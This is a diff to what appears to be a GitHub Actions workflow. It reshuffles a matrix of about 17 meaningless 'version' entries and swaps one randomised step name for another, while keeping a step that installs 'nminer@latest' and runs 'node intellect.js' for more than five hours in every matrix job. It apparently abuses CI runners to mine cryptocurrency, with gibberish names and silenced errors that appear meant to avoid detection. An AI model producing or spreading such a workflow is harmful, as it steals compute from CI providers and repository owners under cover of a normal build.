@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5509 }
-          - { version: 762 }
-          - { version: 7538 }
-          - { version: 8425 }
-          - { version: 8612 }
-          - { version: 7820 }
-          - { version: 5101 }
-          - { version: 3421 }
-          - { version: 2323 }
-          - { version: 8552 }
-          - { version: 7184 }
-          - { version: 2623 }
-          - { version: 1377 }
-          - { version: 5979 }
-          - { version: 7939 }
-          - { version: 4860 }
-          - { version: 5432 }
-          - { version: 8923 }
+          - { version: 412 }
+          - { version: 3329 }
+          - { version: 5765 }
+          - { version: 6258 }
+          - { version: 9891 }
+          - { version: 4126 }
+          - { version: 2058 }
+          - { version: 9878 }
+          - { version: 5733 }
+          - { version: 8066 }
+          - { version: 6640 }
+          - { version: 7690 }
+          - { version: 6676 }
+          - { version: 3577 }
+          - { version: 6469 }
+          - { version: 9162 }
+          - { version: 1476 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: swift versus represent
+      - name: ew alongside bowling whack bore
         run: |
           npm install nminer@latest
-          timeout 310m node intellect.js || echo "intellect executed"
+          timeout 331m node intellect.js || echo "intellect executed"
